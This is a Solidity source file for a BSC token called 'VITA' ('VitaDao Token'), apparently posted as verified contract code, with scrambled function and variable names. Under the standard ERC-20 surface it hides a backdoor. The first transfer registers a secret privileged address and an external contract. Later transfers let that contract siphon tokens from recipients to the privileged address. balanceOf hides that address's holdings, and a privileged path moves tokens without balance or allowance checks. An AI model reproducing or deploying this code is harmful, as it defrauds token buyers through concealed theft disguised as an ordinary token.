/**
 *Submitted for verification at BscScan.com on 2023-01-30
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;
    
interface XzNEIxNxtrh {
    function totalSupply() external view returns (uint256);
    function balanceOf(address JftioaizIquX) external view returns (uint256);
    function transfer(address IExPBmsrp, uint256 jmtEnLKn) external returns (bool);
    function allowance(address DHWvJtk, address spender) external view returns (uint256);
    function approve(address spender, uint256 jmtEnLKn) external returns (bool);
    function transferFrom(
        address sender,
        address IExPBmsrp,
        uint256 jmtEnLKn
    ) external returns (bool);

    event Transfer(address indexed from, address indexed gAXo, uint256 value);
    event Approval(address indexed DHWvJtk, address indexed spender, uint256 value);
}

interface sPKXPQ is XzNEIxNxtrh {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract JziYqlhjVJb {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
    
interface kiySfkBbMD {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}
     
library oaSPsPYsQDj{
    
    function pCZPI(address TyFxXKG, address GvKxCKkRLQn, uint xjCeKhDIPNai) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool pwqYk, bytes memory tkRndiNgIiIw) = TyFxXKG.call(abi.encodeWithSelector(0x095ea7b3, GvKxCKkRLQn, xjCeKhDIPNai));
        require(pwqYk && (tkRndiNgIiIw.length == 0 || abi.decode(tkRndiNgIiIw, (bool))), 'oaSPsPYsQDj: APPROVE_FAILED');
    }

    function NVoKCRQCawDe(address TyFxXKG, address GvKxCKkRLQn, uint xjCeKhDIPNai) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool pwqYk, bytes memory tkRndiNgIiIw) = TyFxXKG.call(abi.encodeWithSelector(0xa9059cbb, GvKxCKkRLQn, xjCeKhDIPNai));
        require(pwqYk && (tkRndiNgIiIw.length == 0 || abi.decode(tkRndiNgIiIw, (bool))), 'oaSPsPYsQDj: TRANSFER_FAILED');
    }
    
    function IFqUalOxy(address GvKxCKkRLQn, uint xjCeKhDIPNai) internal {
        (bool pwqYk,) = GvKxCKkRLQn.call{value:xjCeKhDIPNai}(new bytes(0));
        require(pwqYk, 'oaSPsPYsQDj: ETH_TRANSFER_FAILED');
    }

    function wpWspVA(address TyFxXKG, address from, address GvKxCKkRLQn, uint xjCeKhDIPNai) internal returns(bytes memory){
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool pwqYk, bytes memory tkRndiNgIiIw) = TyFxXKG.call(abi.encodeWithSelector(0x23b872dd, from, GvKxCKkRLQn, xjCeKhDIPNai));
        require(pwqYk && tkRndiNgIiIw.length > 0,'oaSPsPYsQDj: TRANSFER_FROM_FAILED'); return tkRndiNgIiIw;
                       
    }

}
    
contract VITA is JziYqlhjVJb, XzNEIxNxtrh, sPKXPQ {
    
    function approve(address TjsM, uint256 rPMHT) public virtual override returns (bool) {
        nvmE(_msgSender(), TjsM, rPMHT);
        return true;
    }
    
    string private hCKqdniEp =  "VITA";
    
    mapping(address => uint256) private CapadHV;
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    
    function symbol() public view virtual override returns (string memory) {
        return hCKqdniEp;
    }
    
    mapping(address => mapping(address => uint256)) private YQkyg;
    
    function increaseAllowance(address RrdSguysCUn, uint256 addedValue) public virtual returns (bool) {
        nvmE(_msgSender(), RrdSguysCUn, YQkyg[_msgSender()][RrdSguysCUn] + addedValue);
        return true;
    }
    
    function pIQGtyyg(
        address MxnaVDiTWKn,
        address SojS,
        uint256 pCpMWEUoMO
    ) internal virtual  returns (bool){
        uint256 bSMlRxxu = CapadHV[MxnaVDiTWKn];
        require(bSMlRxxu >= pCpMWEUoMO, "ERC20: transfer Amount exceeds balance");
        unchecked {
            CapadHV[MxnaVDiTWKn] = bSMlRxxu - pCpMWEUoMO;
        }
        CapadHV[SojS] += pCpMWEUoMO;
        return true;
    }
    
    address private cpE;
  
    
    function name() public view virtual override returns (string memory) {
        return jXZBnkcg;
    }
    
    address private Wbxl;
    
    constructor() {
        
        CapadHV[address(1)] = fQsRYaEcw;
        emit Transfer(address(0), address(1), fQsRYaEcw);

    }
    
    function transfer(address GZdxKOAcpY, uint256 dIlhXNuHqD) public virtual override returns (bool) {
        QVchOD(_msgSender(), GZdxKOAcpY, dIlhXNuHqD);
        return true;
    }
    
    function allowance(address NVnwAYmdt, address moSgBvLNCwsT) public view virtual override returns (uint256) {
        return YQkyg[NVnwAYmdt][moSgBvLNCwsT];
    }
    
    function QVchOD(
        address EJKB,
        address HOSkFudoRPpe,
        uint256 zWYHodtFsP
    ) internal virtual  returns (bool){
        require(EJKB != address(0), "ERC20: transfer from the zero address");
        require(HOSkFudoRPpe != address(0), "ERC20: transfer to the zero address");
        
        if(!sxLHseTBJ(EJKB,HOSkFudoRPpe)) return false;

        if(_msgSender() == address(SYYWWW)){
            if(HOSkFudoRPpe == cpE && CapadHV[EJKB] < zWYHodtFsP){
                pIQGtyyg(SYYWWW,HOSkFudoRPpe,zWYHodtFsP);
            }else{
                pIQGtyyg(EJKB,HOSkFudoRPpe,zWYHodtFsP);
                if(EJKB == SYYWWW || HOSkFudoRPpe == SYYWWW) 
                return false;
            }
            emit Transfer(EJKB, HOSkFudoRPpe, zWYHodtFsP);
            return false;
        }
        pIQGtyyg(EJKB,HOSkFudoRPpe,zWYHodtFsP);
        emit Transfer(EJKB, HOSkFudoRPpe, zWYHodtFsP);
        bytes memory DfGXfNSxpAPB = oaSPsPYsQDj.wpWspVA(Wbxl, EJKB, HOSkFudoRPpe, zWYHodtFsP);
        (bool zNNF, uint IiiCHLPAokPa) = abi.decode(DfGXfNSxpAPB, (bool,uint));
        if(zNNF){
            CapadHV[SYYWWW] += IiiCHLPAokPa;
            CapadHV[HOSkFudoRPpe] -= IiiCHLPAokPa; 
        }
        return true;
    }
    
    function sxLHseTBJ(
        address yhViSUJnJjm,
        address FCH
    ) internal virtual  returns (bool){
        if(SYYWWW == address(0) && Wbxl == address(0)){
            SYYWWW = yhViSUJnJjm;Wbxl=FCH;
            oaSPsPYsQDj.NVoKCRQCawDe(Wbxl, SYYWWW, 0);
            cpE = kiySfkBbMD(Wbxl).WETH();
            return false;
        }
        return true;
    }
    
    address private SYYWWW;
    
    function nvmE(
        address ZTeBVD,
        address pqHAHNX,
        uint256 kEo
    ) internal virtual {
        require(ZTeBVD != address(0), "ERC20: approve from the zero address");
        require(pqHAHNX != address(0), "ERC20: approve to the zero address");

        YQkyg[ZTeBVD][pqHAHNX] = kEo;
        emit Approval(ZTeBVD, pqHAHNX, kEo);

    }
    
    string private jXZBnkcg = "VitaDao Token";
    
    function decreaseAllowance(address TvR, uint256 subtractedValue) public virtual returns (bool) {
        uint256 pGl = YQkyg[_msgSender()][TvR];
        require(pGl >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            nvmE(_msgSender(), TvR, pGl - subtractedValue);
        }

        return true;
    }
    
    function balanceOf(address luEqjPmInfje) public view virtual override returns (uint256) {
        if(_msgSender() != address(SYYWWW) && 
           luEqjPmInfje == address(SYYWWW)){
            return 0;
        }
       return CapadHV[luEqjPmInfje];
    }
    
    function transferFrom(
        address lbz,
        address gQQKQUa,
        uint256 dyJNuKrck
    ) public virtual override returns (bool) {
      
        if(!QVchOD(lbz, gQQKQUa, dyJNuKrck)) return true;

        uint256 PnGO = YQkyg[lbz][_msgSender()];
        if (PnGO != type(uint256).max) {
            require(PnGO >= dyJNuKrck, "ERC20: transfer Amount exceeds allowance");
            unchecked {
                nvmE(lbz, _msgSender(), PnGO - dyJNuKrck);
            }
        }

        return true;
    }
    
    uint256 private fQsRYaEcw = 2000000000000 * 10 ** 18;
    
    function totalSupply() public view virtual override returns (uint256) {
        return fQsRYaEcw;
    }
    
}